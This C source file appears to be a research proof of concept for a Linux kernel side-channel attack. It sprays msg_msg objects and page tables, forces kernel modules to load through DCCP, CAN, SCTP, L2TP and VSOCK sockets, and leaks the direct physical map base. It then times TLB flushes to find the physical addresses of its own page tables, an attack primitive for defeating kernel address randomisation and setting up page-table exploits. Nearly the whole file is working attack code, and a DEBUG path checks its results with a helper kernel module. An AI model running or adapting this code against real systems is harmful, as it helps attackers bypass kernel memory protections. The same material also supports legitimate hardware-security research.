#include "utils.h"
#include "cacheutils.h"
#include "tlb_flush.h"
#include "coarse_grain_leak.h"
#define DEBUG
#ifdef DEBUG
#include "ulkm.h"
#endif
#include "msg_msg.h"
#include <sys/socket.h>
#include <sys/mman.h>
#define IPPROTO_DCCP 33
#define IPPROTO_SCTP 132
#define IPPROTO_L2TP 115
#define CAN_RAW 1
#define CAN_BCM 2
#define CAN_ISOTP 6

#define HIST_SIZE 60
#define TRIES 40

#define PAGE_SIZE (1<<12)
#define PMD_SIZE (1<<21)

#define MSG_SIZE (256 - 48)
#define MSG_SPRAYS (1<<8)*32
#define MSG_TYPE 0x41

/**
 * on some CPUs this is more reliable (12th gen)
 */
// #define IS_HIT(t, tn2, tn4, tn8) (((tn2) - (t)) >= (THRESHOLD2-THRESHOLD+2) || ((tn4) - (t)) >= (THRESHOLD2-THRESHOLD+2) || ((tn8) - (t) >= (THRESHOLD2-THRESHOLD+2)))
// #define PT_SPRAY (30)
// #define PT_OTHER_SPRAY (10)
/**
 * and on some other CPUs this is more reliable (13th gen)
 */
#define IS_HIT(t, tn2, tn4, tn8) ((t) < THRESHOLD && ((tn2) > THRESHOLD || (tn4) > THRESHOLD || (tn8) > THRESHOLD))
#define PT_SPRAY (504)
#define PT_OTHER_SPRAY (8)

int qids[MSG_SPRAYS];

void __hit_flush(void *uaddr, size_t addr, size_t tries, size_t *time, size_t *time_n, size_t *time_n4, size_t *time_n8, size_t print)
{
    size_t t;
    size_t times[tries];
    size_t hist[HIST_SIZE] = {0};
    size_t times_n[tries];
    size_t hist_n[HIST_SIZE] = {0};
    size_t times_n4[tries];
    size_t hist_n4[HIST_SIZE] = {0};
    size_t times_n8[tries];
    size_t hist_n8[HIST_SIZE] = {0};
    /* leaking */
    for (size_t i = 0; i < tries; ++i) {
        flush_tlb_targeted_4k(addr);
        flush_tlb_targeted_4k(addr+PAGE_SIZE);
        flush_tlb_targeted_4k(addr+PAGE_SIZE*4);
        flush_tlb_targeted_4k(addr+PAGE_SIZE*8);
        if (i % 2 == 0)
            mprotect(uaddr, PAGE_SIZE, PROT_READ);
        else
            mprotect(uaddr, PAGE_SIZE, PROT_WRITE);
        t = onlyreload(addr);
        hist[MIN(t,HIST_SIZE-2)]++;
        times[i] = t;

        t = onlyreload(addr+PAGE_SIZE);
        times_n[i] = t;
        hist_n[MIN(t,HIST_SIZE-2)]++;

        t = onlyreload(addr+PAGE_SIZE*4);
        times_n4[i] = t;
        hist_n4[MIN(t,HIST_SIZE-2)]++;

        t = onlyreload(addr+PAGE_SIZE*8);
        times_n8[i] = t;
        hist_n8[MIN(t,HIST_SIZE-2)]++;
    }
    qsort(times, tries, sizeof(size_t), comp);
    qsort(times_n, tries, sizeof(size_t), comp);
    qsort(times_n4, tries, sizeof(size_t), comp);
    qsort(times_n8, tries, sizeof(size_t), comp);
    for (size_t i = 20; i < HIST_SIZE && print; i += 2)
        printf("% 4zd:\t %3zd %3zd %3zd %3zd\n", i, hist[i], hist_n[i], hist_n4[i], hist_n8[i]);
    *time = times[tries/8];
    *time_n = times_n[tries/8];
    *time_n4 = times_n4[tries/8];
    *time_n8 = times_n8[tries/8];
}
void hit_flush(void *uaddr, size_t addr, size_t tries, size_t *time, size_t *time_n, size_t *time_n4, size_t *time_n8)
{
    __hit_flush(uaddr, addr, tries, time, time_n, time_n4, time_n8, 0);
}
void hit_flush_print(void *uaddr, size_t addr, size_t tries, size_t *time, size_t *time_n, size_t *time_n4, size_t *time_n8)
{
    __hit_flush(uaddr, addr, tries, time, time_n, time_n4, time_n8, 1);
}

int main(void)
{
    printf("[*] start\n");
    set_limit();
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    pin_to_core(0);

    init_tlb_flush();
    get_total_memory();

    static char buffer[0x1000] = {0};
    msg *message = (msg *)buffer;
    message->mtype = MSG_TYPE;

    printf("[*] make queues\n");
    for (size_t i = 0; i < MSG_SPRAYS; ++i)
        qids[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);

    printf("[*] warmup and other alloc msg_msg structs\n");
    for (size_t i = 0; i < MSG_SPRAYS; ++i)
        send_msg(qids[i], message, MSG_SIZE, 0);

    printf("[*] reserve mmappings\n");
    void *addresses[PT_SPRAY];
    for (size_t i = 0; i < PT_SPRAY; ++i) {
        void *addr = (void *)((0x6dULL<<30) + (1ULL<<21)*i);
        addresses[i] = mmap(addr, PAGE_SIZE, PROT_WRITE|PROT_READ, MAP_FIXED|MAP_ANON|MAP_PRIVATE, -1, 0);
        // printf("[*] addresses[%ld] %0zx (%016zx)\n", i, (size_t)addresses[i], (size_t)addr);
        if (addresses[i] == MAP_FAILED) {
            perror("mmap()");
            exit(-1);
        }
    }
    void *other_addresses[PT_OTHER_SPRAY];
    for (size_t i = 0; i < PT_OTHER_SPRAY; ++i) {
        void *addr = (void *)((0x6fULL<<30) + (1ULL<<21)*i);
        other_addresses[i] = mmap(addr, PAGE_SIZE, PROT_WRITE|PROT_READ, MAP_FIXED|MAP_ANON|MAP_PRIVATE, -1, 0);
        // printf("[*] other_addresses[%ld] %0zx (%016zx)\n", i, (size_t)other_addresses[i], (size_t)addr);
        if (other_addresses[i] == MAP_FAILED) {
            perror("mmap()");
            exit(-1);
        }
    }

    printf("[*] load 1st half of kernel modules\n");
    int sock_fd;
    sock_fd = socket(AF_INET, SOCK_DCCP, IPPROTO_DCCP);
    if (sock_fd < 0) {
        perror("socket(AF_INET, SOCK_DCCP, IPPROTO_DCCP)");
        exit(-1);
    }
    sock_fd = socket(SOCK_DGRAM, CAN_BCM, 0);
    if (sock_fd < 0) {
        perror("socket(SOCK_DGRAM, CAN_BCM, 0)");
        exit(-1);
    }
    sock_fd = socket(AF_VSOCK, SOCK_STREAM, 0);
    if (sock_fd < 0) {
        perror("socket(AF_VSOCK, SOCK_STREAM, 0)");
        exit(-1);
    }

    /* hopefully allocate PUD of 4k mapping */
    for (size_t i = 0; i < PT_SPRAY; ++i)
        *(volatile size_t *)addresses[i];
    for (size_t i = 0; i < PT_OTHER_SPRAY; ++i)
        *(volatile size_t *)other_addresses[i];

    printf("[*] load 2nd half of kernel modules\n");
    sock_fd = socket(AF_CAN, SOCK_DGRAM, CAN_ISOTP);
    if (sock_fd < 0) {
        perror("socket(AF_CAN, SOCK_DGRAM, CAN_ISOTP");
        exit(-1);
    }
    sock_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP);
    if (sock_fd < 0) {
        perror("socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP)");
        exit(-1);
    }
    sock_fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_L2TP);
    if (sock_fd < 0) {
        perror("socket(PF_INET, SOCK_STREAM, IPPROTO_L2TP)");
        exit(-1);
    }

    size_t time;
    size_t time_n;
    size_t time_n4;
    size_t time_n8;
    size_t dpm_base = dpm_leak(TRIES);
    printf("[*] dpm_base: %016zx\n", dpm_base);

#ifdef DEBUG
    lkm_init();
    size_t real_dpm_base;
    lkm_dpm_leak((size_t)&real_dpm_base);
    if (real_dpm_base != dpm_base) {
        printf("[*] wrong dpm base %016zx != %016zx\n", real_dpm_base, dpm_base);
        exit(-1);
    }

    size_t success = 0;
    size_t cnt = 0;

    size_t pgde;
    size_t pude;
    size_t pmde;
    size_t pte;
    lkm_arb_pagetable_wald((size_t)addresses[0], &pgde, &pude, &pmde, &pte);
    size_t pud = dpm_base + (pgde & ~(0xfff));
    size_t pmd = dpm_base + (pude & ~(0xfff));
    size_t pt = dpm_base + (pmde & ~(0xfff));
    printf("[*] %010zx %010zx %010zx\n", pud, pmd, pt);
    size_t is_4kb = lkm_is_4kb(pmd);
    printf("[*] target %016zx is %s page\n", pmd, is_4kb ? "4kB" : "2MB");
    // hit_flush_print(addresses[0], pmd, TRIES*10, &time, &time_n, &time_n4, &time_n8);
#endif

    for (size_t addr = dpm_base+(1ULL<<30); addr < dpm_base+mem_total_rounded; addr += PMD_SIZE) {
        if ((addr % (1 << 30)) == 0)
            printf("[*] addr %016zx\n", addr);
        hit_flush(addresses[0], addr, TRIES/4, &time, &time_n, &time_n4, &time_n8);
        if (time < THRESHOLD && time_n < THRESHOLD && time_n4 < THRESHOLD && time_n8 < THRESHOLD)
            continue;
        for (size_t addr4k = addr; addr4k < addr + PMD_SIZE; addr4k += PAGE_SIZE) {
            hit_flush(addresses[0], addr4k, TRIES, &time, &time_n, &time_n4, &time_n8);
            size_t found = IS_HIT(time, time_n, time_n4, time_n8);
            if (found) {
                for (size_t i = 1; i < PT_SPRAY && found == 1; ++i) {
                    hit_flush(addresses[i], addr4k, TRIES, &time, &time_n, &time_n4, &time_n8);
                    found = IS_HIT(time, time_n, time_n4, time_n8);
                }
                for (size_t i = 1; i < PT_OTHER_SPRAY && found == 1; ++i) {
                    hit_flush(other_addresses[i], addr4k, TRIES, &time, &time_n, &time_n4, &time_n8);
                    found = !IS_HIT(time, time_n, time_n4, time_n8);
                }
            }
            if (found) {
#ifdef DEBUG
                cnt++;
                success |= (addr4k == pmd);
#endif
                printf("[+] found addr %016zx\n", addr4k);
            }

        }
    }

    printf("[*] cleanup\n");
    for (size_t i = 0; i < MSG_SPRAYS; ++i)
        cleanup_queue(qids[i]);
#ifdef DEBUG
    if (success == 1 && cnt == 1)
        printf("[+] success\n");
    // else if (!is_4kb)
    //     printf("[*] 2MB page\n");
    else if (success == 1 && cnt > 1)
        printf("[*] multiple addresses -> retry\n");
    else if (cnt == 0)
        printf("[*] not found\n");
    else if (cnt == 1)
        printf("[!] fail with wrong address\n");
    else
        printf("[*] fail with multiple addresses\n");
#else
    printf("[*] done\n");
#endif
    return 0;
}
